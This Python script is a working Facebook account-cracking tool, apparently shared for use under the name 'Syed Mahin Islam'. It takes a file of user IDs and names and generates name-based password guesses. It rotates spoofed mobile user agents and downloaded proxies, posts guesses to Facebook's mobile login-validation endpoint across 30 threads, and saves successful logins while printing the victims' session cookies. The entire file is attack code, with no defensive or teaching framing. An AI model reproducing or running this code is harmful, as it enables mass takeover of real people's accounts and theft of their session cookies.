  #-----------SYED CYBER-------------#
#---------SYED MAHIN ISLAM-----------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ SYED-MAHIN ]-------------------#
import os, platform, time, sys
os.system('clear')
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 9; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.83 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G977N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 10; itel W5002 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 OPR/76.0.2254.68989",]
ua = ["Mozilla/5.0 (Linux; Android 9; Hisense E40 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/72.0 Mobile/14E304 Safari/605.1.15",]
ua = ["Mozilla/5.0 (Linux; Android 12; Primo GH11 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 11; Lenovo K13 Note Build/RTAS31.68-66-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; TECNO LH8n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 10_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/78.0 Mobile/14D27 Safari/605.1.15",]
ua = ["Mozilla/5.0 (Linux; Android 11; Hisense U31 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 10; S20 Ultra ApeX 2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaApp_Android/23.32.1 YaSearchBrowser/23.32.1 BroPP/1.0 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 10; itel W5002 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 OPR/76.0.2254.68989",]
ua = ["Mozilla/5.0 (Linux; Android 9; Hisense E40 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xs in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.1.1','6.0.1','9','10','11','12','13','14','15','16'])
	c=random.choice(['SM-J510F','SM-J510G','SM-J510FN','SM-J510Y','SM-J510M','SM-J510GN','SM-J510H','SM-J510MN','SM-J5108','SM-J510UN','SM-J510L','SM-J510S','SM-J510FQ','SM-J510K'])
	d=random.choice(['Build/NMF26X',' Build/PQ3B.190801.002','Build/MMB29M'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	bc=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(bc)

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5','6','7','8','10','11','12','13','14','15','16'])
	c=random.choice(['Infinix X6511B Build/RP1A.201005.001','Infinix X6511B Build/PPR1.180610.011'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	ac=(f"{a} {b}; {c}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(ac)

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.0.0','10','11','12','13','14','15','16'])
	c=random.choice(['SM-J600G','SM-J600F','SM-J600G','SM-J600FN','SM-J600GF','SM-J600GT','SM-J600L','SM-J600N'])
	d=random.choice(['Build/QP1A.190711.020','Build/R16NW','Build/PPR1.180610.011'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	ca=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(ca)

def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
h = '\x1b[1;92m' # HIJAU +
U = '\x1b[1;95m' 
hh = '\033[32m' # HIJAU -
kk = '\033[33m' # KUNING -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,b]) 
###----------[ ANSII COLOR STYLE ]---------- ### 

Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

bo = '\033[0m'
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'JANUARY','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'NOVEMBER','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'NOVEMBER','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'-'+str(bln)+'-'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Tutul.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#------------------[ LOGO-LAKNAT ]-----------------#
logo=("""  \33[1;92m

   ███    ███  █████  ██   ██ ██ ███    ██ 
   ████  ████ ██   ██ ██   ██ ██ ████   ██ 
   ██ ████ ██ ███████ ███████ ██ ██ ██  ██ 
   ██  ██  ██ ██   ██ ██   ██ ██ ██  ██ ██ 
   ██      ██ ██   ██ ██   ██ ██ ██   ████  

\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\033[1;31m[\033[1;32m=\033[1;31m] \033[1;32mFOUNDER \033[1;91m:\033[1;32m SYED MAHIN ISLAM 
\033[1;31m[\033[1;32m=\033[1;31m] \033[1;32mGITHUB  \033[1;91m:\033[1;32m NOT FOUNDED\x1b[1;91m!
\033[1;31m[\033[1;32m=\033[1;31m] \033[1;32mVERSION \033[1;91m:\033[1;32m 0.1
\033[1;31m[\033[1;32m=\033[1;31m] \033[1;32mFUNCTION\033[1;91m:\033[1;32m FILE
\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""") 
os.system('clear')
print(logo)
pass

def loading():
    animation = [
        '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
        '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
        '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
        '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
        '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
        '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
        '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
        '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
        '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
        '[\x1b[1;91m■■■■■■■■■■\x1b[0m]']
    for i in range(10):
        time.sleep(0.14)
        sys.stdout.write(f'''\r\x1b[1;91m[\x1b[1;92m=\x1b[1;91m] \x1b[1;92mSYSTEM LOADING...{N} ''' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush() 
loading()

def line():
	print(f'\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')

def clear():
	os.system('clear')
#------------------[ MENU ]----------------#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
    line()
    print(f"""\033[1;91m[\033[1;92m1\033[1;91m] \033[0;92mFILE CLONING""")
    print("""\033[1;91m[\033[1;92m2\033[1;91m] \033[0;93mCONTACT WITH ADMIN""")
    print("""\033[1;91m[\033[1;92m0\033[1;91m] EXIT""")
    line()
    TUTUL = input('\x1b[1;91m[\x1b[1;92m=\x1b[1;91m]\x1b[1;92m CHOOSE : ')
    if TUTUL in ['1']:
        crack_file()
    elif TUTUL in ['2','02']:
        os.system('xdg-open https://wa.me/+8801608843956')
        menu()
    elif TUTUL in ['0']:
        animation(' [×] BYEE BROTHER ')
        exit()
    else:
    	menu()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    clear();print(logo);o = input('\033[97;1m[\033[92;1m+\033[97;1m] \x1b[1;32mPUT YOUR FILE NAME :\033[92;1m ')
    try:lin = open(o).read().splitlines()
    except:
        line()
        animation(' \x1b[1;91m[×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    clear();print(logo);line()
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mONLY OLD ID CLONING")
    print("\033[97;1m[\033[92;1m2\033[97;1m] ONLY NEW ID CLONING")
    print("\033[97;1m[\033[92;1m3\033[97;1m] \033[0;92mOLD NEW MIX ID CLONING")
    line()
    M4X = input('\033[97;1m[\033[92;1m+\033[97;1m]CHOOSE :\033[92;1m ')
    if M4X in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif M4X in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif M4X in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    os.system('clear');print(logo)
    line()
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 ") 
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 ")
    line()
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print("\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m TODAY'S DATE\033[1;97m :\033[1;92m "+date)
    print("\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m TOTAL AMOUMT \033[0;97m:\033[1;92m",str(len(id)))
    print("\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m CURRENT TIME\033[0;97m : \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m CHECK YOUR IP IF NO RESULTS \033[1;91m!")
    line()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append('123456')
                    pwv.append('12345678')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'gaming')
                    pwv.append('gaming'+frs)
                    pwv.append('king'+frs)
                    pwv.append('@@@###')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'786')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append('123456')
                    pwv.append('12345678')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append('@@@###')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    line()
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] TOTAL OK IDZ :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[97;1m] TOTAL CP IDZ :\033[0;93m %s '%(cp))
    line()
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m PRESS ENTER')
    exit()
 
#--------------------[ METODE M1 FILE ]-----------------#
import sys 
def crack(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r\033[100;92m{bo}[MAHIN-M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}ALIVE{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7', 'cache-control': 'max-age=0', 'dpr': '1.46875', 'referer': 'https://x.facebook.com/', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5771.214", "Google Chrome";v="116.0.5771.214"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'viewport-width': '980',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[MAHIN-CP] {idf} • {pw}')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\x1b[38;5;208m[MAHIN-OK] {idf} • {pw}\n\033[0;93m[💙]= COOKIES • \033[0;92m{kuki} ')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(1)
    loop+=1
 
#------------------[ METHODE M2 FILE ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r\033[100;92m[MAHIN-FINDING➤ M2]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}ALIVE{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7', 'cache-control': 'max-age=0', 'dpr': '1.46875', 'referer': 'https://mbasic.facebook.com/', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5771.214", "Google Chrome";v="116.0.5771.214"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'viewport-width': '980',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[MAHIN-CP] {idf} • {pw}')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\x1b[38;5;208m[MAHIN-OK] {idf} • {pw}\n\033[0;93m[💙]= COOKIES • \033[0;92m{kuki} ')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(1)
    loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()